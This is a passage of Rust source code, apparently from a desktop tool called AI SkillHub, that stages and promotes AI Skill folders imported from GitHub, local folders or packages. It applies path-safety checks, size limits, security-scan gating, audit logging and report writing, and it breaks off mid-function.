    if relative.as_os_str().is_empty() {
        return None;
    }
    Some(relative)
}

fn github_download_error_message(error: ureq::Error) -> String {
    match error {
        ureq::Error::Status(status, response) => {
            let message = response
                .into_string()
                .unwrap_or_default()
                .chars()
                .take(280)
                .collect::<String>();
            if message.trim().is_empty() {
                format!("HTTP {}", status)
            } else {
                format!("HTTP {}: {}", status, compact_note(&message))
            }
        }
        ureq::Error::Transport(error) => compact_note(&error.to_string()),
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct GithubRepositoryFile {
    path: String,
    size: u64,
    api_url: String,
}

fn select_github_repository_files(
    tree_payload: &Value,
) -> Result<Vec<GithubRepositoryFile>, String> {
    let entries = tree_payload
        .get("tree")
        .and_then(Value::as_array)
        .ok_or_else(|| "GitHub 文件树响应缺少 tree 数组。".to_string())?;
    let mut blobs = Vec::new();
    let mut skill_roots = HashSet::new();
    for entry in entries {
        if entry.get("type").and_then(Value::as_str) != Some("blob") {
            continue;
        }
        let Some(path) = entry.get("path").and_then(Value::as_str) else {
            continue;
        };
        if entry.get("mode").and_then(Value::as_str) == Some("120000") {
            continue;
        }
        let Some(relative_path) = safe_relative_github_path(path) else {
            continue;
        };
        if archive_entry_should_skip(&relative_path) {
            continue;
        }
        let size = entry.get("size").and_then(Value::as_u64).unwrap_or(0);
        let api_url = entry
            .get("url")
            .and_then(Value::as_str)
            .unwrap_or("")
            .to_string();
        if relative_path
            .file_name()
            .and_then(|name| name.to_str())
            .map(|name| name.eq_ignore_ascii_case("SKILL.md"))
            .unwrap_or(false)
        {
            skill_roots.insert(
                relative_path
                    .parent()
                    .unwrap_or_else(|| Path::new(""))
                    .to_path_buf(),
            );
        }
        blobs.push(GithubRepositoryFile {
            path: path.to_string(),
            size,
            api_url,
        });
    }

    let mut selected = if skill_roots.is_empty() {
        blobs
    } else {
        blobs
            .into_iter()
            .filter(|file| {
                let path = Path::new(&file.path);
                skill_roots
                    .iter()
                    .any(|root| root.as_os_str().is_empty() || path.starts_with(root))
            })
            .collect::<Vec<_>>()
    };
    selected.sort_by(|left, right| left.path.cmp(&right.path));
    selected.dedup_by(|left, right| left.path == right.path);
    Ok(selected)
}

fn github_http_agent() -> ureq::Agent {
    ureq::AgentBuilder::new()
        .try_proxy_from_env(true)
        .https_only(true)
        .timeout_connect(Duration::from_secs(15))
        .timeout_read(Duration::from_secs(60))
        .timeout_write(Duration::from_secs(30))
        .build()
}

fn github_json_request(
    agent: &ureq::Agent,
    url: &str,
    owner: &str,
    repo: &str,
) -> Result<Value, String> {
    let mut request = agent
        .get(url)
        .set("User-Agent", "AI-SkillHub")
        .set("Accept", "application/vnd.github+json");
    let token = github_api_token();
    if let Some(token) = token.as_deref() {
        request = request.set("Authorization", &format!("Bearer {token}"));
    }
    request
        .call()
        .map_err(|error| github_api_error_message(owner, repo, error))?
        .into_json()
        .map_err(|error| format!("GitHub API 响应无法解析：{}", error))
}

fn safe_relative_github_path(path: &str) -> Option<PathBuf> {
    let path = PathBuf::from(path.replace('\\', "/"));
    if path.as_os_str().is_empty()
        || path.components().any(|component| {
            matches!(
                component,
                Component::ParentDir | Component::RootDir | Component::Prefix(_)
            )
        })
    {
        return None;
    }
    Some(path)
}

fn percent_encode_url_component(value: &str) -> String {
    value
        .as_bytes()
        .iter()
        .map(|byte| {
            if byte.is_ascii_alphanumeric() || matches!(*byte, b'-' | b'_' | b'.' | b'~') {
                (*byte as char).to_string()
            } else {
                format!("%{:02X}", byte)
            }
        })
        .collect()
}

fn write_managed_source_metadata(
    source_path: &Path,
    url: &str,
    download_method: &str,
    default_branch: &str,
) -> Result<(), String> {
    let payload = serde_json::json!({
        "schemaVersion": 1,
        "url": url,
        "downloadMethod": download_method,
        "defaultBranch": default_branch,
        "downloadedAt": unix_timestamp_string()
    });
    fs::write(
        source_path.join(MANAGED_SOURCE_METADATA_FILE),
        serde_json::to_string_pretty(&payload)
            .map_err(|error| format!("Cannot serialize managed source metadata: {}", error))?,
    )
    .map_err(|error| format!("Cannot write managed source metadata: {}", error))
}

fn stage_local_source_import(
    root: &Path,
    plan: &SourceImportPlanCard,
    staged_path: &Path,
    execution: &mut SourceImportExecutionCard,
) -> Result<(), String> {
    let source_path = PathBuf::from(&plan.normalized_target);
    let app_private = user_data_root(root);
    if source_path.starts_with(&app_private) {
        execution.status = "blocked".to_string();
        execution.summary =
            "Local staging refused because the source is inside SkillHub's private runtime folder."
                .to_string();
        execution
            .blocking_checks
            .push("Do not import from AI SkillHub's private user-data folder.".to_string());
        return Ok(());
    }

    let (file_count, byte_count) = local_copy_preflight(&source_path)?;
    if file_count > SOURCE_IMPORT_MAX_FILES || byte_count > GITHUB_FALLBACK_MAX_BYTES {
        execution.status = "blocked".to_string();
        execution.summary = format!(
            "Local staging refused because the candidate is too large: {} file(s), {} byte(s).",
            file_count, byte_count
        );
        execution.blocking_checks.push(format!(
            "Staging limit is {} files and 80 MB.",
            SOURCE_IMPORT_MAX_FILES
        ));
        return Ok(());
    }

    copy_directory_filtered(&source_path, staged_path)?;
    let (skill_count, prompt_count) = count_skill_dirs_in_path(staged_path)?;
    execution.status = if skill_count > 0 { "staged" } else { "warn" }.to_string();
    execution.summary = format!(
        "Local source staged into isolated folder: {} file(s), {} byte(s), {} Skill folder(s).",
        file_count, byte_count, skill_count
    );
    execution.copied_files = file_count;
    execution.copied_bytes = byte_count;
    execution.skill_count = skill_count;
    execution.prompt_count = prompt_count;
    execution.blocking_checks = vec![
        "This step only stages the local source before formal promotion.".to_string(),
        "After promotion, enable real-write authorization and use sync to link AI tools."
            .to_string(),
    ];
    Ok(())
}

fn stage_package_source_import(
    plan: &SourceImportPlanCard,
    staged_path: &Path,
    execution: &mut SourceImportExecutionCard,
) -> Result<(), String> {
    let package_path = PathBuf::from(&plan.normalized_target);
    let inspection = inspect_package_archive(&package_path)?;
    if !inspection.safe_to_extract {
        execution.status = "blocked".to_string();
        execution.summary =
            "Package staging refused because the archive safety inspection failed.".to_string();
        execution.blocking_checks = inspection.blocking_checks;
        return Ok(());
    }
    if inspection.file_count > SOURCE_IMPORT_MAX_FILES
        || inspection.uncompressed_bytes > GITHUB_FALLBACK_MAX_BYTES
    {
        execution.status = "blocked".to_string();
        execution.summary = format!(
            "Package staging refused because the archive is too large: {} file(s), {} byte(s).",
            inspection.file_count, inspection.uncompressed_bytes
        );
        execution.blocking_checks.push(format!(
            "Staging limit is {} files and 80 MB.",
            SOURCE_IMPORT_MAX_FILES
        ));
        return Ok(());
    }

    extract_package_archive_filtered(&package_path, staged_path)?;
    let (skill_count, prompt_count) = count_skill_dirs_in_path(staged_path)?;
    execution.status = if skill_count > 0 { "staged" } else { "warn" }.to_string();
    execution.summary = format!(
        "Package source extracted into isolated staging folder: {} file(s), {} byte(s), {} Skill folder(s).",
        inspection.file_count, inspection.uncompressed_bytes, skill_count
    );
    execution.copied_files = inspection.file_count;
    execution.copied_bytes = inspection.uncompressed_bytes;
    execution.skill_count = skill_count;
    execution.prompt_count = prompt_count.max(inspection.prompt_count);
    execution.blocking_checks = vec![
        "Formal package installation is still locked behind Release Gate.".to_string(),
        "AI tool sync/link remains locked.".to_string(),
    ];
    Ok(())
}

fn write_source_import_execution_report(
    root: &Path,
    connection: &Connection,
    mut execution: SourceImportExecutionCard,
    timestamp: &str,
) -> Result<SourceImportExecutionCard, String> {
    let report_dir = source_import_report_root(root);
    fs::create_dir_all(&report_dir).map_err(|error| {
        format!(
            "Cannot create source import staging report folder: {}",
            error
        )
    })?;
    let safe_id = sanitize_source_folder_name(&execution.id);
    let json_path = report_dir.join(format!("{}.json", safe_id));
    let md_path = report_dir.join(format!("{}.md", safe_id));
    let manifest_path = report_dir.join(format!("{}-manifest.json", safe_id));
    execution.report_path = md_path.to_string_lossy().to_string();
    execution.manifest_path = manifest_path.to_string_lossy().to_string();

    let report_body = serde_json::json!({
        "kind": "v2-source-import-staging",
        "generatedAt": timestamp,
        "id": &execution.id,
        "importKind": &execution.import_kind,
        "status": &execution.status,
        "riskLevel": &execution.risk_level,
        "summary": &execution.summary,
        "stagedPath": &execution.staged_path,
        "copiedFiles": execution.copied_files,
        "copiedBytes": execution.copied_bytes,
        "skillCount": execution.skill_count,
        "promptCount": execution.prompt_count,
        "blockingChecks": &execution.blocking_checks,
        "rollbackSteps": &execution.rollback_steps,
        "realWriteScope": &execution.real_write_scope,
        "downloadMethod": &execution.download_method,
        "securityStatus": &execution.security_status,
        "securityScannedFiles": execution.security_scanned_files,
        "securityFindings": &execution.security_findings,
        "formalInstall": false,
        "aiToolSync": false
    });
    let report_json = serde_json::to_string_pretty(&report_body)
        .map_err(|error| format!("Cannot serialize staging report: {}", error))?;
    fs::write(&json_path, &report_json)
        .map_err(|error| format!("Cannot write staging JSON report: {}", error))?;
    let security_findings = execution
        .security_findings
        .iter()
        .take(50)
        .map(|finding| {
            format!(
                "- **{}** `{}` line {} — {}",
                finding.severity, finding.relative_path, finding.line, finding.summary
            )
        })
        .collect::<Vec<_>>()
        .join("\n");
    let markdown = format!(
        "# Source Import Staging\n\nStatus: `{}`\n\n{}\n\nDownload method: `{}`\n\nStaged path: `[REDACTED]`\n\nSkills: `{}`\n\nFiles: `{}`\n\nSecurity scan: `{}` across `{}` file(s)\n\nSecurity findings:\n{}\n\nChecks:\n{}\n\nFormal install: `false`\n\nAI tool sync: `false`\n",
        execution.status,
        execution.summary,
        execution.download_method,
        execution.skill_count,
        execution.copied_files,
        execution.security_status,
        execution.security_scanned_files,
        if security_findings.is_empty() {
            "- None".to_string()
        } else {
            security_findings
        },
        execution
            .blocking_checks
            .iter()
            .map(|check| format!("- {}", check))
            .collect::<Vec<_>>()
            .join("\n")
    );
    fs::write(&md_path, markdown)
        .map_err(|error| format!("Cannot write staging Markdown report: {}", error))?;
    let manifest = serde_json::json!({
        "kind": "v2-source-import-staging-manifest",
        "generatedAt": timestamp,
        "status": &execution.status,
        "report": path_file_name(&md_path),
        "json": path_file_name(&json_path),
        "realWrites": false,
        "writeScope": "app-next/.skillhub-next/staging only"
    });
    fs::write(
        &manifest_path,
        serde_json::to_string_pretty(&manifest)
            .map_err(|error| format!("Cannot serialize staging manifest: {}", error))?,
    )
    .map_err(|error| format!("Cannot write staging manifest: {}", error))?;

    write_audit_event(
        connection,
        "source_import_staged",
        "Created source import staging report",
        serde_json::json!({
            "id": &execution.id,
            "status": &execution.status,
            "kind": &execution.import_kind,
            "reportPath": &execution.report_path,
            "scope": "staging-only"
        }),
    )?;

    Ok(execution)
}

fn promote_staged_source_import_in_connection(
    root: &Path,
    connection: &Connection,
    import_kind: &str,
    staged_path: &str,
    source_name: &str,
    security_review_confirmed: bool,
) -> Result<SourceImportPromotionCard, String> {
    let timestamp = unix_timestamp_string();
    let normalized_kind = compact_note(import_kind);
    let raw_source_name = compact_note(source_name);
    let source_name = sanitize_source_folder_name(&raw_source_name);
    let staging_root = source_import_staging_root(root);
    let staged_candidate = PathBuf::from(staged_path.trim());
    let storage_name = if normalized_kind == "github" {
        staged_github_storage_name(&staged_candidate, &source_name)
    } else {
        source_name.clone()
    };
    let target_path = PathBuf::from(source_import_target_path(root, &storage_name));
    let mut promotion = SourceImportPromotionCard {
        id: format!(
            "source-import-promote-{}-{}",
            stable_id("managed-source", &source_name),
            timestamp
        ),
        import_kind: normalized_kind.clone(),
        source_name: source_name.clone(),
        status: "blocked".to_string(),
        risk_level: "medium".to_string(),
        summary: String::new(),
        staged_path: staged_candidate.to_string_lossy().to_string(),
        target_path: target_path.to_string_lossy().to_string(),
        report_path: String::new(),
        manifest_path: String::new(),
        copied_files: 0,
        copied_bytes: 0,
        skill_count: 0,
        prompt_count: 0,
        blocking_checks: Vec::new(),
        rollback_steps: vec![
            format!("删除受管理来源目录：{}", target_path.display()),
            "重新运行扫描以刷新 SQLite 索引。".to_string(),
            "Claude/Codex/Antigravity 目录没有被本步骤写入。".to_string(),
        ],
        real_write_scope: "app-next/data/github_sources-only".to_string(),
        security_status: "not-run".to_string(),
        security_scanned_files: 0,
        security_findings: Vec::new(),
        security_review_confirmed: false,
    };

    if source_name.is_empty() || source_name == "source-import" {
        promotion
            .blocking_checks
            .push("来源名称为空或无法生成安全目录名。".to_string());
    }
    if !staged_candidate.exists() {
        promotion
            .blocking_checks
            .push("staging 目录不存在，请先执行隔离 staging。".to_string());
    }
    if !staging_root.exists() {
        promotion
            .blocking_checks
            .push("staging 根目录不存在，请先执行隔离 staging。".to_string());
    }
    let target_already_exists = target_path.exists();

    if promotion.blocking_checks.is_empty() {
        let canonical_staging_root = staging_root
            .canonicalize()
            .map_err(|error| format!("Cannot read staging root: {}", error))?;
        let canonical_staged_path = staged_candidate
            .canonicalize()
            .map_err(|error| format!("Cannot read staged source path: {}", error))?;
        if !canonical_staged_path.starts_with(&canonical_staging_root) {
            promotion
                .blocking_checks
                .push("只能提升 AI SkillHub 自己创建的 staging 目录。".to_string());
        }

        let (skill_count, prompt_count) = count_skill_dirs_in_path(&canonical_staged_path)?;
        promotion.skill_count = skill_count;
        promotion.prompt_count = prompt_count;
        if skill_count == 0 && prompt_count == 0 {
            promotion
                .blocking_checks
                .push("staging 目录没有发现 SKILL.md 或 Prompt-like Markdown。".to_string());
        }

        let security = security_scan::scan_source_tree(&canonical_staged_path)?;
        promotion.security_status = security.status.clone();
        promotion.security_scanned_files = security.scanned_files;
        promotion.security_findings = security.findings.clone();
        let content_review_required = matches!(security.status.as_str(), "review" | "warn")
            || (!security.findings.is_empty() && security.status == "blocked");
        if content_review_required && security_review_confirmed {
            promotion.security_review_confirmed = true;
        } else {
            for finding in security
                .findings
                .iter()
                .filter(|finding| finding.severity == "high")
                .take(24)
            {
                promotion.blocking_checks.push(format!(
                    "[{}] {}:{} — {}",
                    finding.severity, finding.relative_path, finding.line, finding.summary
                ));
            }
        }
        promotion.blocking_checks.extend(
            security
                .blocking_reasons
                .iter()
                .filter(|reason| {
                    !(content_review_required
                        && security_review_confirmed
                        && reason.contains("high-risk content finding"))
                })
                .cloned(),
        );
        if security.risk_level == "high" {
            promotion.risk_level = "high".to_string();
        }
        if content_review_required {
            promotion.risk_level = "medium".to_string();
            if !security_review_confirmed {
                promotion.blocking_checks.push(
                    "安全扫描发现需要复核的内容；扫描期间没有执行仓库脚本。查看证据并显式确认后，可将来源加入本地管理并保持停用。"
                        .to_string(),
                );
            }
        }
    }

    if !promotion.blocking_checks.is_empty() {
        promotion.summary = "提升为受管理来源被阻止；没有写入正式来源目录。".to_string();
        return write_source_import_promotion_report(root, connection, promotion, &timestamp);
    }

    if target_already_exists {
        let copied_files = count_files_in_path(&target_path)?;
        let copied_bytes = directory_size_bytes(&target_path)?;
        let (skill_count, prompt_count) = count_skill_dirs_in_path(&target_path)?;
        promotion.status = "already-managed".to_string();
        promotion.risk_level = "low".to_string();
        promotion.summary = format!(
            "来源已在来源库中：{} file(s), {} Skill folder(s), {} Prompt-like Markdown file(s)。本次没有覆盖或删除任何文件。",
            copied_files, skill_count, prompt_count
        );
        promotion.copied_files = copied_files;
        promotion.copied_bytes = copied_bytes;
        promotion.skill_count = skill_count;
        promotion.prompt_count = prompt_count;
        promotion.blocking_checks = vec![
            "目标来源目录已存在；本次按“已添加过”处理。".to_string(),
            "没有覆盖、合并或删除任何正式来源文件。".to_string(),
            "安装动作会刷新共享 Skills、父子路由和 Agent 链接。".to_string(),
        ];
        promotion.rollback_steps = vec![
            "本次没有执行新写入；通常无需回滚。".to_string(),
            "如需移除该来源，请在来源库中删除对应来源并重新扫描。".to_string(),
            "如需撤销 Agent 链接，请删除该来源后重新同步。".to_string(),
        ];
        promotion.real_write_scope = "app-next/data/github_sources-existing".to_string();
        return write_source_import_promotion_report(root, connection, promotion, &timestamp);
    }

    let parent = target_path
        .parent()
        .ok_or_else(|| "Cannot resolve source import target parent.".to_string())?;
    fs::create_dir_all(parent)
        .map_err(|error| format!("Cannot create managed sources root: {}", error))?;
    let preserve_git = normalized_kind == "github";
    copy_directory_filtered_with_options(&staged_candidate, &target_path, preserve_git)?;
    let copied_files = count_files_in_path(&target_path)?;
    let copied_bytes = directory_size_bytes(&target_path)?;
    let (skill_count, prompt_count) = count_skill_dirs_in_path(&target_path)?;
    promotion.status = "promoted".to_string();
    promotion.risk_level = if promotion.security_review_confirmed {
        "high"
    } else if preserve_git {
        "medium"
    } else {
        "low"
    }
    .to_string();
    promotion.summary = if promotion.security_review_confirmed {
        format!(
            "已加入本地受管理来源：{} file(s), {} Skill folder(s), {} Prompt-like Markdown file(s)。来源保持停用，不会自动同步到 AI 工具。",
            copied_files, skill_count, prompt_count
        )
    } else {
        format!(
            "已提升为受管理来源：{} file(s), {} Skill folder(s), {} Prompt-like Markdown file(s)。正在刷新共享 Skills、父子路由和 Agent 链接。",
            copied_files, skill_count, prompt_count
        )
    };
    promotion.copied_files = copied_files;
    promotion.copied_bytes = copied_bytes;
    promotion.skill_count = skill_count;
    promotion.prompt_count = prompt_count;
    promotion.blocking_checks = if promotion.security_review_confirmed {
        vec!["已复核加入本地来源库；保持停用，未写入共享 Skills 或 AI 工具链接。".to_string()]
    } else {
        vec![
            "本步骤先写入 app-next/data/github_sources，再由安装动作刷新共享 Skills 和 Agent 链接。"
                .to_string(),
        ]
    };
    write_source_import_promotion_report(root, connection, promotion, &timestamp)
}

fn write_source_import_promotion_report(
    root: &Path,
    connection: &Connection,
    mut promotion: SourceImportPromotionCard,
    timestamp: &str,
) -> Result<SourceImportPromotionCard, String> {
    let report_dir = source_import_promotion_report_root(root);
    fs::create_dir_all(&report_dir).map_err(|error| {
        format!(
            "Cannot create source import promotion report folder: {}",
            error
        )
    })?;
    let safe_id = sanitize_source_folder_name(&promotion.id);
    let json_path = report_dir.join(format!("{}.json", safe_id));
    let md_path = report_dir.join(format!("{}.md", safe_id));
    let manifest_path = report_dir.join(format!("{}-manifest.json", safe_id));
    promotion.report_path = md_path.to_string_lossy().to_string();
    promotion.manifest_path = manifest_path.to_string_lossy().to_string();
    if promotion.security_status != "not-run" {
        let high_findings = promotion
            .security_findings
            .iter()
            .filter(|finding| finding.severity == "high")
            .count();
        let medium_findings = promotion
            .security_findings
            .iter()
            .filter(|finding| finding.severity == "medium")
            .count();
        source_governance::record_security_scan(
            connection,
            &stable_id("source", &promotion.source_name),
            &promotion.security_status,
            promotion.security_scanned_files,
            high_findings,
            medium_findings,
        )?;
    }
    let ai_tool_sync = promotion.real_write_scope.contains("agent-links")
        && !promotion
            .blocking_checks
            .iter()
            .any(|check| check.contains("Agent 链接同步未完成"));

    let report_body = serde_json::json!({
        "kind": "v2-source-import-promotion",
        "generatedAt": timestamp,
        "id": &promotion.id,
        "importKind": &promotion.import_kind,
        "sourceName": &promotion.source_name,
        "status": &promotion.status,
        "riskLevel": &promotion.risk_level,
        "summary": &promotion.summary,
        "stagedPath": &promotion.staged_path,
        "targetPath": &promotion.target_path,
        "copiedFiles": promotion.copied_files,
        "copiedBytes": promotion.copied_bytes,
        "skillCount": promotion.skill_count,
        "promptCount": promotion.prompt_count,
        "blockingChecks": &promotion.blocking_checks,
        "rollbackSteps": &promotion.rollback_steps,
        "realWriteScope": &promotion.real_write_scope,
        "securityStatus": &promotion.security_status,
        "securityScannedFiles": promotion.security_scanned_files,
        "securityFindings": &promotion.security_findings,
        "securityReviewConfirmed": promotion.security_review_confirmed,
        "formalSourceInstall": promotion.status == "promoted" || promotion.status == "already-managed",
        "aiToolSync": ai_tool_sync
    });
    fs::write(
        &json_path,
        serde_json::to_string_pretty(&report_body)
            .map_err(|error| format!("Cannot serialize promotion report: {}", error))?,
    )
    .map_err(|error| format!("Cannot write promotion JSON report: {}", error))?;
    let security_findings = promotion
        .security_findings
        .iter()
        .take(50)
        .map(|finding| {
            format!(
                "- **{}** `{}` line {} — {}",
                finding.severity, finding.relative_path, finding.line, finding.summary
            )
        })
        .collect::<Vec<_>>()
        .join("\n");
    let markdown = format!(
        "# Source Import Promotion\n\nStatus: `{}`\n\n{}\n\nTarget path: `{}`\n\nSkills: `{}`\n\nFiles: `{}`\n\nSecurity scan: `{}` across `{}` file(s)\n\nSecurity review confirmed: `{}`\n\nSecurity findings:\n{}\n\nAI tool sync: `{}`\n",
        promotion.status,
        promotion.summary,
        promotion.target_path,
        promotion.skill_count,
        promotion.copied_files,
        promotion.security_status,
        promotion.security_scanned_files,
        promotion.security_review_confirmed,
        if security_findings.is_empty() {
            "- None".to_string()
        } else {
            security_findings
        },
        ai_tool_sync
    );
    fs::write(&md_path, markdown)
        .map_err(|error| format!("Cannot write promotion Markdown report: {}", error))?;
    let manifest = serde_json::json!({
        "kind": "v2-source-import-promotion-manifest",
        "generatedAt": timestamp,
        "status": &promotion.status,
        "report": path_file_name(&md_path),
        "json": path_file_name(&json_path),
        "realWrites": promotion.status == "promoted" || ai_tool_sync,
        "writeScope": &promotion.real_write_scope
    });
    fs::write(
        &manifest_path,
        serde_json::to_string_pretty(&manifest)
            .map_err(|error| format!("Cannot serialize promotion manifest: {}", error))?,
    )
    .map_err(|error| format!("Cannot write promotion manifest: {}", error))?;

    write_audit_event(
        connection,
        "source_import_promoted",
        "Promoted staged source import into managed sources",
        serde_json::json!({
            "id": &promotion.id,
            "status": &promotion.status,
            "kind": &promotion.import_kind,
            "targetPath": &promotion.target_path,
            "reportPath": &promotion.report_path,
            "scope": &promotion.real_write_scope,
            "securityReviewConfirmed": promotion.security_review_confirmed
        }),
    )?;

    Ok(promotion)
}

fn build_github_source_import_plan(
    root: &Path,
    sources: &[SourceCard],
    input: &str,
) -> Result<SourceImportPlanCard, String> {
    let Some((owner, repo)) = parse_github_repo(input) else {
        return Ok(SourceImportPlanCard {
            id: stable_id("source-import-github-invalid", input),
            import_kind: "github".to_string(),
            input: input.to_string(),
            normalized_target: input.to_string(),
            target_root: source_import_target_root(root),
            target_path: String::new(),
            backup_path: String::new(),
            display_name: "GitHub 地址格式错误".to_string(),
            status: "blocked".to_string(),
            risk_level: "high".to_string(),
            write_gate_status: "blocked".to_string(),
            safe_to_continue: false,
            duplicate_source_id: String::new(),
            duplicate_reason:
                "只接受普通 GitHub 仓库地址，例如 https://github.com/owner/repo.git。".to_string(),
            skill_count: 0,
            prompt_count: 0,
            planned_steps: vec![
                "修正仓库地址。".to_string(),
                "重新生成 dry-run 计划。".to_string(),
            ],
            install_plan_steps: Vec::new(),
            blocking_checks: vec!["GitHub URL 不是普通仓库地址。".to_string()],
            rollback_summary: "没有执行 clone、pull 或文件写入。".to_string(),
        });
    };

    let normalized_target = normalized_github_repo_url(&owner, &repo);
    let duplicate = sources.iter().find(|source| {
        parse_github_repo(&source.url)
            .map(|(existing_owner, existing_repo)| {
                normalize_lookup_key(&existing_owner) == normalize_lookup_key(&owner)
                    && normalize_lookup_key(&existing_repo) == normalize_lookup_key(&repo)
            })
            .unwrap_or(false)
    });
    let display_name = repo.clone();
    let duplicate_reason = duplicate
        .map(|source| {
            format!(
                "已存在同源 GitHub 仓库：{}。本次会按“刷新已有来源”处理，不会重复创建。",
                source.name
            )
        })
        .unwrap_or_default();
    let safe_to_continue = true;
    let storage_name = github_source_storage_name(&owner, &repo);
    let target_path = source_import_target_path(root, &storage_name);
    let backup_path = source_import_backup_path(root, &storage_name);
    let mut blocking_checks = Vec::new();
    if !duplicate_reason.is_empty() {
        blocking_checks.push(duplicate_reason.clone());
    }
    blocking_checks.push("真实写入仍需备份 dry-run、恢复 dry-run、Release Gate 通过。".to_string());

    Ok(SourceImportPlanCard {
        id: stable_id("source-import-github", &normalized_target),
        import_kind: "github".to_string(),
        input: input.to_string(),
        normalized_target,
        target_root: source_import_target_root(root),
        target_path,
        backup_path,
        display_name,
        status: if duplicate.is_some() { "warn" } else { "ready" }.to_string(),
        risk_level: if duplicate.is_some() { "medium" } else { "low" }.to_string(),
        write_gate_status: "dry-run-ready".to_string(),
        safe_to_continue,
        duplicate_source_id: duplicate
            .map(|source| source.id.clone())
            .unwrap_or_default(),
        duplicate_reason,
        skill_count: 0,
        prompt_count: 0,
        planned_steps: vec![
            "校验 GitHub 普通仓库地址并规范化为 .git URL。".to_string(),
            "检查 v2 SQLite 中是否已有同源仓库。".to_string(),
            "未来真实导入前先创建快照和回滚计划。".to_string(),
            "未来真实导入时 clone/pull 到 app-next/data/github_sources，再扫描 SKILL.md。"
                .to_string(),
        ],
        install_plan_steps: vec![
            "创建 source-import 快照和目标目录备份 dry-run。".to_string(),
            "如果目标目录已存在，先复制到 app-next/.skillhub-next/backups/source-imports。"
                .to_string(),
            "clone 或 pull 到隔离的 app-next/data/github_sources 子目录。".to_string(),
            "重新扫描 SKILL.md，并只更新 v2 SQLite 来源索引。".to_string(),
            "真实 Claude/Codex/Antigravity 接管继续等待 Release Gate。".to_string(),
        ],
        blocking_checks,
        rollback_summary: "当前只生成 dry-run；没有 clone、pull、复制或链接接管。".to_string(),
    })
}

fn build_local_source_import_plan(
    root: &Path,
    sources: &[SourceCard],
    input: &str,
) -> Result<SourceImportPlanCard, String> {
    let input_path = PathBuf::from(input);
    let path = if input_path.is_absolute() {
        input_path
    } else {
        root.join(input_path)
    };
    let normalized_target = path.to_string_lossy().to_string();
    let display_name = path
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or("local-source")
        .to_string();
    let duplicate = sources.iter().find(|source| {
        normalize_path_for_compare(&source.local_path)
            == normalize_path_for_compare(&normalized_target)
            || normalize_lookup_key(&source.name) == normalize_lookup_key(&display_name)
    });

    if duplicate.is_some() {
        return Ok(SourceImportPlanCard {
            id: stable_id("source-import-local-duplicate", &normalized_target),
            import_kind: "local".to_string(),
            input: input.to_string(),
            normalized_target,
            target_root: source_import_target_root(root),
            target_path: source_import_target_path(root, &display_name),
            backup_path: source_import_backup_path(root, &display_name),
            display_name,
            status: "blocked".to_string(),
            risk_level: "high".to_string(),
            write_gate_status: "blocked".to_string(),
            safe_to_continue: false,
            duplicate_source_id: duplicate
                .map(|source| source.id.clone())
                .unwrap_or_default(),
            duplicate_reason: format!(
                "已存在同名或同路径来源：{}。真实导入前必须合并或改名。",
                duplicate.map(|source| source.name.as_str()).unwrap_or("")
            ),
            skill_count: 0,
            prompt_count: 0,
            planned_steps: vec![
                "打开已存在来源并确认是否需要保留。".to_string(),
                "如果确实是新来源，请先改名或移动到不同路径。".to_string(),
            ],
            install_plan_steps: Vec::new(),
            blocking_checks: vec!["同名或同路径来源已存在。".to_string()],
            rollback_summary: "没有复制或链接任何本地文件。".to_string(),
        });
    }

    if !path.exists() {
        return Ok(SourceImportPlanCard {
            id: stable_id("source-import-local-missing", &normalized_target),
            import_kind: "local".to_string(),
            input: input.to_string(),
            normalized_target,
            target_root: source_import_target_root(root),
            target_path: source_import_target_path(root, &display_name),
            backup_path: source_import_backup_path(root, &display_name),
            display_name,
            status: "blocked".to_string(),
            risk_level: "high".to_string(),
            write_gate_status: "blocked".to_string(),
            safe_to_continue: false,
            duplicate_source_id: String::new(),
            duplicate_reason: "本地路径不存在。".to_string(),
            skill_count: 0,
            prompt_count: 0,
            planned_steps: vec!["确认路径是否拼写正确，或重新选择文件夹。".to_string()],
            install_plan_steps: Vec::new(),
            blocking_checks: vec!["本地路径不存在。".to_string()],
            rollback_summary: "没有读取到有效来源，也没有执行文件写入。".to_string(),
        });
    }

    if !path.is_dir() {
        return Ok(SourceImportPlanCard {
            id: stable_id("source-import-local-file", &normalized_target),
            import_kind: "local".to_string(),
            input: input.to_string(),
            normalized_target,
            target_root: source_import_target_root(root),
            target_path: source_import_target_path(root, &display_name),
            backup_path: source_import_backup_path(root, &display_name),
            display_name,
            status: "blocked".to_string(),
            risk_level: "high".to_string(),
            write_gate_status: "blocked".to_string(),
            safe_to_continue: false,
            duplicate_source_id: String::new(),
            duplicate_reason: "本地导入需要选择文件夹；zip/.skill 文件请切换到包导入。".to_string(),
            skill_count: 0,
            prompt_count: 0,
            planned_steps: vec!["切换导入类型，或选择包含 SKILL.md 的文件夹。".to_string()],
            install_plan_steps: Vec::new(),
            blocking_checks: vec!["本地导入输入不是文件夹。".to_string()],
            rollback_summary: "没有复制或链接任何本地文件。".to_string(),
        });
    }

    let (skill_count, prompt_count) = count_skill_dirs_in_path(&path)?;
    let has_skills = skill_count > 0;

    Ok(SourceImportPlanCard {
        id: stable_id("source-import-local", &normalized_target),
        import_kind: "local".to_string(),
        input: input.to_string(),
        normalized_target,
        target_root: source_import_target_root(root),
        target_path: source_import_target_path(root, &display_name),
        backup_path: source_import_backup_path(root, &display_name),
        display_name,
        status: if has_skills { "ready" } else { "warn" }.to_string(),
        risk_level: if has_skills { "low" } else { "medium" }.to_string(),
        write_gate_status: if has_skills {
            "dry-run-ready"
        } else {
            "blocked"
        }
        .to_string(),
        safe_to_continue: has_skills,
        duplicate_source_id: String::new(),
        duplicate_reason: if has_skills {
            String::new()
        } else {
            "没有扫描到 SKILL.md；真实导入时不会把普通 Prompt 文档当成 Skill。".to_string()
        },
        skill_count,
        prompt_count,
        planned_steps: vec![
            "递归扫描 SKILL.md，并跳过 .git、node_modules、target 等目录。".to_string(),
            "检查重复来源和重复 Skill 文件夹名。".to_string(),
            "未来真实导入前先创建快照和备份 dry-run。".to_string(),
            "只有有效 Skill 目录会进入候选库；Prompt 资料单独管理。".to_string(),
        ],
        install_plan_steps: vec![
            "创建 source-import 快照和目标目录备份 dry-run。".to_string(),
            "把本地来源作为候选登记到 v2 SQLite，不修改原文件夹。".to_string(),
            "生成有效 SKILL.md 列表和重复名称报告。".to_string(),
            "需要复制/链接时先写入可回滚安装计划。".to_string(),
            "真实 Claude/Codex/Antigravity 接管继续等待 Release Gate。".to_string(),
        ],
        blocking_checks: if has_skills {
            vec!["真实写入仍需备份 dry-run、恢复 dry-run、Release Gate 通过。".to_string()]
        } else {
